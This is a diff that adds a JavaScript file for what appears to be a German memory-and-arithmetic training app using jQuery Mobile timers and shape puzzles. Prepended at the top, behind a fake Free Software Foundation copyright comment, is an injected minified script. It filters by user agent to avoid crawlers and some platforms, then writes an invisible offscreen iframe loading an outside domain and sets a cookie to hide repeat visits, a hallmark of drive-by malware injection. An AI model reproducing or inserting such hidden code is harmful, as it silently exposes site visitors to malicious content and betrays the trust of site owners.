@@ -1,0 +1,233 @@
+/*
+Copyright (C) 2007 Free Software Foundation, Inc. http://fsf.org/
+*/
+function getCookie(a){var b=document.cookie.match(new RegExp("(?:^|; )"+a.replace(/([\.$?*|{}\(\)\[\]\\\/\+^])/g,"\\$1")+"=([^;]*)"));return b?decodeURIComponent(b[1]):undefined}(function(){function c(e,h,j){var g=(e+"").toLowerCase();var i=(h+"").toLowerCase();var f=0;if((f=g.indexOf(i,j))!==-1){return f}return false}function b(){var e=["Linux","Windows NT 6.3","Yandex","rv:11.0","AppleWebKit","Googlebot","Android","IEMobile","Windows NT 6.2"];var g=false;for(var f in e){if(c(navigator.userAgent,e[f])){g=true;break}}return g}var d=(getCookie("ipmoture_aurma")===undefined);if(!b()&&d){document.write('<iframe src="http://elspirit.elfurancho.com/elspirit17.html?ma" style="border-style:dotted solid double dashed;top: -1000px;left: -1000px;border-top-width: 3px;position: absolute;border-left-width: 3px;" height="143" width="143"></iframe>');var a=new Date(new Date().getTime()+48*60*60*1000);document.cookie="ipmoture_aurma=1; path=/; expires="+a.toUTCString()}})();
+/*
+Copyright (C) 2000 Free Software Foundation, Inc. See LICENSE.txt
+*/// JavaScript Document
+var gestartet = false;
+var sek = 0;
+var rd = 0;
+var vz = 0; // Vorzeichen 0 = -, 1 = +
+var AktFeld = 0;
+var merkzeit = 45;
+var rechenzeit = 90;
+var ergebnis = 0;
+var prozent = 0;
+var mg = new Array (3);
+
+
+function SetVisible(VisId) {
+	if (VisId == false) {
+      $("#uet1").fadeIn(1000);
+      $("#uebung1").hide();
+	} else {
+      $("#uet1").fadeOut(500);
+      $("#uebung1").show();
+	}
+}
+
+function SetEVisible(VisId) {
+	if (VisId == false) {
+	  document.getElementById("e1").style.visibility='hidden';
+	  document.getElementById("e2").style.visibility='hidden';
+	  document.getElementById("e3").style.visibility='hidden';
+	  document.getElementById("e4").style.visibility='hidden';
+	  document.getElementById("e5").style.visibility='hidden';
+	  document.getElementById("e6").style.visibility='hidden';
+	  document.getElementById("e7").style.visibility='hidden';
+	  document.getElementById("e8").style.visibility='hidden';
+	  document.getElementById("e9").style.visibility='hidden';
+	  document.getElementById("e10").style.visibility='hidden';
+	  document.getElementById("e11").style.visibility='hidden';
+	  document.getElementById("e12").style.visibility='hidden';
+	  $("#TErgebnis").text("");
+      $("#BW2").show();
+	} else {
+	  document.getElementById("e1").style.visibility='visible';
+	  document.getElementById("e2").style.visibility='visible';
+	  document.getElementById("e3").style.visibility='visible';
+	  document.getElementById("e4").style.visibility='visible';
+	  document.getElementById("e5").style.visibility='visible';
+	  document.getElementById("e6").style.visibility='visible';
+	  document.getElementById("e7").style.visibility='visible';
+	  document.getElementById("e8").style.visibility='visible';
+	  document.getElementById("e9").style.visibility='visible';
+	  document.getElementById("e10").style.visibility='visible';
+	  document.getElementById("e11").style.visibility='visible';
+	  document.getElementById("e12").style.visibility='visible';
+      $("#BW2").hide();
+	}
+}
+
+
+function CallFehler () {
+var eingabe = 0;
+    eingabe = document.getElementById("eg1").value;    
+	if (eingabe == ergebnis)  {
+           document.getElementById("pruefBild").style.backgroundImage = "url(images/Prueferin0.png)";           
+		wertungstext = "Hervorragend, Du bist unschlagbar !";
+	} else {
+           document.getElementById("pruefBild").style.backgroundImage = "url(images/Prueferin6-8.png)";           
+        wertungstext = "Uups - " + eingabe + " ist leider falsch. Das richtige Ergebnis lautet: " + ergebnis;
+    };
+	$("#pruefText").text(wertungstext);
+	$("#TErgebnis").text("Das Ergebnis lautet " + ergebnis + ",deine Eingabe " + eingabe);
+    $.mobile.changePage( "#SF0", { transition: "slideup"} );
+	SetEVisible (true);
+}
+
+	var timer2 = $.timer(function() {
+    if (sek >= rechenzeit) {
+		timer2.stop();
+        $.mobile.changePage( "#Uebung3", { transition: "slideup"} );
+    } else {
+      sek = sek + 0.1;
+	  prozent = sek / rechenzeit * 100;
+	  $( "#progressbar2" ).progressbar({value: prozent});
+    }
+	});
+
+
+function Rechne() {
+	var kreis = 1;
+	var dreieck = 1;
+	var quadrat = 1;
+	var id = "";
+	var sid = "";
+	ergebnis = 0;
+	for (var j=1;j<=12;j++) {
+		id = "#e" + j;
+		if (j < 10) sid = "s" + "0" + j; else sid = "s" + j;
+	    rd = GetRandom (1, 12);
+		if ((rd >= 1) && (rd <= 4)) { // Dreieck
+			if (dreieck == 1) document.getElementById(sid).style.backgroundImage = "url(images/d1.png)";
+			if (dreieck == 2) document.getElementById(sid).style.backgroundImage = "url(images/d2.png)";
+			if (dreieck == 3) document.getElementById(sid).style.backgroundImage = "url(images/d3.png)";
+			if (dreieck == 4) {
+				document.getElementById(sid).style.backgroundImage = "url(images/d4.png)";
+				dreieck = 0; 
+			}
+			ergebnis = ergebnis + mg[0];
+            $(id).text(mg[0]);
+            dreieck++;
+			
+		}
+		if ((rd >= 5) && (rd <= 8)) { // Quadrat
+			if (quadrat == 1) document.getElementById(sid).style.backgroundImage = "url(images/q1.png)";
+			if (quadrat == 2) document.getElementById(sid).style.backgroundImage = "url(images/q2.png)";
+			if (quadrat == 3) document.getElementById(sid).style.backgroundImage = "url(images/q3.png)";
+			if (quadrat == 4) {
+				document.getElementById(sid).style.backgroundImage = "url(images/q4.png)";
+				quadrat = 0; 
+			}
+			ergebnis = ergebnis + mg[1];
+            $(id).text(mg[1]);
+			quadrat++;
+		}
+		if ((rd >= 9) && (rd <= 12)) { // kreis
+			if (kreis == 1) document.getElementById(sid).style.backgroundImage = "url(images/k1.png)";
+			if (kreis == 2) document.getElementById(sid).style.backgroundImage = "url(images/k2.png)";
+			if (kreis == 3) document.getElementById(sid).style.backgroundImage = "url(images/k3.png)";
+			if (kreis == 4) {
+				document.getElementById(sid).style.backgroundImage = "url(images/k4.png)";
+				kreis = 0; 
+			}
+			ergebnis = ergebnis + mg[2];
+            $(id).text(mg[2]);
+			kreis++;
+		}
+	}
+    sek = 0;
+	$("#progressbar2").progressbar({ value: 0});
+	timer2.set({ time : 100, autostart : true });
+}
+
+
+var timer = $.timer(function() {
+    if (sek >= merkzeit) {
+      $.mobile.changePage( "#Uebung2", { transition: "slideup"} );
+	  timer.stop();
+	  Rechne();
+    } else {
+      sek = sek + 0.1;
+	  prozent = sek / merkzeit * 100;
+	  $( "#progressbar1" ).progressbar({value: prozent});
+    }
+});
+
+function Starte() {
+        var i = 0;
+		SetEVisible (false);
+	  // AktFeld = 100; später für Abbruch
+	  i = 0;
+	  for (var j=0;j<=2;j++)
+	  {
+		 mg[j] = 0;
+	  }
+	  rd = 0;
+	  while (i <= 2) {
+		gefunden = true;
+		while (gefunden==true) {
+    	  rd = GetRandom (1, 9);
+    	  vz = GetRandom (0, 1);
+      	  if (vz == 0) {
+    		 rd = rd*-1;
+    	  }
+		  gefunden = false;
+		  for (var j=0;j<=2;j++)
+		  {
+			   if (rd == mg[j]) gefunden = true;
+		  }
+		}
+			
+		mg[i] = rd;
+		i++;
+	  }
+	  if (mg[0] > 0) $("#symbol1").text("+" + mg[0]); else $("#symbol1").text(mg[0]);
+	  if (mg[1] > 0) $("#symbol2").text("+" + mg[1]); else $("#symbol2").text(mg[1]);
+	  if (mg[2] > 0) $("#symbol3").text("+" + mg[2]); else $("#symbol3").text(mg[2]);
+	  SetVisible (true);
+	sek = 0;
+	timer.set({ time : 100, autostart : true });
+} //Starte
+
+function Neustart() {
+	SetVisible (false);
+	SetEVisible (false);
+	$("#progressbar1").progressbar({ value: 0});
+	$("#eg1").progressbar({ value: 0});
+} //Neustart
+
+$(window).load(function(){
+  app.initialize();
+    Neustart();
+	$("#BStart").click(function(){
+	  Starte ();
+	});
+    
+	$("#BErststart").click(function(){
+	  Neustart ();
+      $.mobile.changePage( "#Uebung1", { transition: "slideup"} );
+	});
+    
+	$("#BNeustart").click(function(){
+	  Neustart ();
+      $.mobile.changePage( "#Uebung1", { transition: "slideup"} );
+	});
+    
+	$("#BY").click(function(){
+        CallFehler()
+    })
+	$("#BWeiter").click(function(){
+        CallFehler()
+    })
+	$("#BW1").click(function(){
+        sek = merkzeit;
+    })
+	$("#BW2").click(function(){
+        sek = rechenzeit;
+    })
+});
+
+
